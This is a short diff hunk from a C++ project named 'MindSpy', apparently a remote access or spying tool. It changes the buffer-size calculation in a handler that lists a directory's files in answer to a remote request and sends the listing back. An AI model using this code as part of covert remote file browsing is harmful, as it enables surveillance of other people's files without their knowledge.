@@ -117,7 +117,7 @@ namespace MindSpy
 				FileSystem fs;
 				stFileInfoRequest * stfir = (stFileInfoRequest*)(szBuff +8);
 				stListaArchivos stla = fs.getDirContent(stfir->Path, stfir->Filtro, (ContentDir)stfir->Query, NULL);
-				DWORD SizeOfData = (sizeof(WCHAR)*MAX_PATH) + (sizeof(FILETIME)) + (sizeof(long long) * 2);
+				DWORD SizeOfData = (sizeof(WCHAR)*MAX_PATH) + (sizeof(long long) * 3);
 				SizeOfData *= stla.CantArchivos;
 				SizeOfData += sizeof(UINT32);
 				BYTE *DataSend = (BYTE*)VirtualAlloc(NULL, SizeOfData, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
